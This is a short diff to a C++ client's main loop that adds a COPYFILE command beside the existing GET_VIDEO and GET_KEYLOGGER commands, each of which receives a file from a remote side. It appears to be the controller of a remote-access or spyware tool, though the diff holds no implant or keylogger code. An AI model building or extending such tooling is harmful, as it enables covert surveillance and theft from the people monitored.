@@ -1,5 +1,5 @@
 #include "client.h"
-
+#include "sstream"
 int main()
 {
     Client client;
@@ -11,11 +11,18 @@ int main()
         if (client.command == "EXIT")
             break;
         client.SendCommand();
-        if (client.command == "GET_VIDEO")
+        std::stringstream ss(client.command);
+        std::string com, body;
+        ss>>com>>body;
+        if(com == "COPYFILE")
+        {
+            client.ReceiveFile("../data/copyfile");
+        }
+        if (com == "GET_VIDEO")
         {
             client.ReceiveFile("../data/video");
         }
-        else if(client.command == "GET_KEYLOGGER")
+        else if(com == "GET_KEYLOGGER")
         {
             client.ReceiveFile("../data/keylogger");
         }
